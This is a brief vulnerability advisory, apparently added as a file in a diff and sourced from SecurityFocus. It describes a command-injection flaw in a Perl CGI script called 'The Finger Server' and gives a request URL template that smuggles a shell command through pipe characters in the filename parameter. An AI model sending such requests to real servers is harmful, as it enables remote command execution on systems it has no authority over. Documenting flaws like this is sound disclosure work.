@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/974/info
+
+'The Finger Server' is a perl script for providing .plan-like functionality through a website. Due to insufficient input checking it is possible for remote unauthenticated users to execute shell commands on the server which will run with the priveleges of the webserver. 
+
+A request like:
+http ://target/finger.cgi?action=archives&cmd=specific
+&filename=99.10.28.15.23.username.|<shell command>|
+(split for readability)
+will cause the server to execute whatever command is specified. 
